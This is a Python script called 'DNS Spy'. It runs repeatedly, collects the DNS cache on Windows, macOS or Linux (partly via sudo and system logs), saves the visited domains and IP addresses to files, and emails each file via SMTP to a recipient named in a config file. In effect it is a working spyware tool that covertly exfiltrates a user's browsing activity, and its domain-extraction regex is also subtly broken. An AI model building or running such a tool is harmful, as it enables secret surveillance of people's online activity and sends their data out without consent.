import os
import re
import time
import platform
from configparser import ConfigParser
from subprocess import Popen, PIPE
from typing import Set
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Configuration Loader
def load_config(config_file: str = "dnsSpy.conf") -> dict:
    config = ConfigParser()
    if not os.path.exists(config_file):
        raise FileNotFoundError(f"Configuration file '{config_file}' not found.")
    config.read(config_file)

    return {
        "save_filename": config["SAVE"]["filename"],
        "interval_dns": float(config["TIME"]["interval_dns"]),
        "smtp_server": config["EMAIL"]["smtp_server"],
        "smtp_port": int(config["EMAIL"]["smtp_port"]),
        "sender_email": config["EMAIL"]["sender_email"],
        "sender_password": config["EMAIL"]["sender_password"],
        "recipient_email": config["EMAIL"]["recipient_email"]
    }

# Send email with attachment
def send_email(file_path: str, config: dict):
    try:
        # Prepare the email content
        subject = "DNS Data Extracted"
        body = "Attached is the DNS data extracted from your system."

        # Create message container
        msg = MIMEMultipart()
        msg['From'] = config["sender_email"]
        msg['To'] = config["recipient_email"]
        msg['Subject'] = subject

        # Attach the body with the msg instance
        msg.attach(MIMEText(body, 'plain'))

        # Open the file in binary mode and attach it
        with open(file_path, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(file_path)}")
            msg.attach(part)

        # Connect to the Gmail SMTP server
        with smtplib.SMTP(config["smtp_server"], config["smtp_port"]) as server:
            server.starttls()  # Secure the connection
            server.login(config["sender_email"], config["sender_password"])  # Login to the email server
            server.sendmail(config["sender_email"], config["recipient_email"], msg.as_string())  # Send email
            print(f"Email sent successfully to {config['recipient_email']}")

    except Exception as e:
        print(f"Failed to send email: {e}")

# DNS Cache Extractor with more info
def extract_dns_data() -> Set[str]:
    dns_data = set()
    try:
        # Log the extraction timestamp
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"Extracting DNS data at {timestamp}...")

        # Detect platform and choose appropriate DNS command
        if platform.system() == "Windows":
            command = ["ipconfig", "/displaydns"]
            process = Popen(command, stdout=PIPE, stderr=PIPE)
            stdout, stderr = process.communicate()

            if stderr:
                print(f"Error executing command: {stderr.decode()}")
                return dns_data

            domain_pattern = re.compile(r"([a-zA-Z0-9]([-_]?[a-zA-Z0-9]){0,62}\.)+[a-zA-Z]{2,5}")
            ip_pattern = re.compile(r"([0-9]{1,3}\.){3}[0-9]{1,3}")

            domains = set(match[0] for match in domain_pattern.findall(stdout.decode()))
            ips = set(match[0] for match in ip_pattern.findall(stdout.decode()))
            dns_data = domains.union(ips)

        elif platform.system() == "Darwin":  # macOS
            process = Popen(["sudo", "killall", "-INFO", "mDNSResponder"], stdout=PIPE, stderr=PIPE)
            stdout, stderr = process.communicate()

            if stderr:
                print(f"Error executing command: {stderr.decode()}")
                return dns_data

            with open("/var/log/system.log", "r") as log_file:
                log_data = log_file.read()
                domain_pattern = re.compile(r"([a-zA-Z0-9]([-_]?[a-zA-Z0-9]){0,62}\.)+[a-zA-Z]{2,5}")
                ip_pattern = re.compile(r"([0-9]{1,3}\.){3}[0-9]{1,3}")

                domains = set(match[0] for match in domain_pattern.findall(log_data))
                ips = set(match[0] for match in ip_pattern.findall(log_data))
                dns_data = domains.union(ips)

        else:
            if os.path.exists("/usr/bin/resolvectl"):
                command = ["resolvectl", "query", "--dns-cache"]
            elif os.path.exists("/usr/sbin/nscd"):
                command = ["nscd", "-g"]
            elif os.path.exists("/usr/sbin/dnsmasq"):
                command = ["sudo", "killall", "-USR1", "dnsmasq"]
            else:
                print("No known DNS cache manager found on this system.")
                return dns_data

            process = Popen(command, stdout=PIPE, stderr=PIPE)
            stdout, stderr = process.communicate()

            if stderr:
                print(f"Error executing command: {stderr.decode()}")
                return dns_data

            domain_pattern = re.compile(r"([a-zA-Z0-9]([-_]?[a-zA-Z0-9]){0,62}\.)+[a-zA-Z]{2,5}")
            ip_pattern = re.compile(r"([0-9]{1,3}\.){3}[0-9]{1,3}")

            domains = set(match[0] for match in domain_pattern.findall(stdout.decode()))
            ips = set(match[0] for match in ip_pattern.findall(stdout.decode()))
            dns_data = domains.union(ips)

        return dns_data

    except Exception as e:
        print(f"Failed to extract DNS data: {e}")
        return set()

# Save Data to a New File with more info
def save_to_file(data: Set[str], save_filename: str, config: dict):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"{save_filename}_{timestamp}.txt"

        with open(filename, "w") as file:
            file.write(f"=== DNS Data Extracted at {timestamp} ===\n")
            for item in data:
                file.write(item + "\n")

        print(f"Saved {len(data)} entries to {filename}")

        # Send the file via email
        send_email(filename, config)

    except Exception as e:
        print(f"Failed to save data to file: {e}")

# Main Function
def main():
    try:
        # Load configuration
        config = load_config()
        save_filename = config["save_filename"]
        interval_dns = config["interval_dns"]

        print("Starting DNS Spy...")

        while True:
            print("Extracting DNS data...")
            dns_data = extract_dns_data()

            if dns_data:
                save_to_file(dns_data, save_filename, config)

            print(f"Waiting {interval_dns} seconds before the next extraction...")
            time.sleep(interval_dns)

    except KeyboardInterrupt:
        print("Process interrupted by user.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
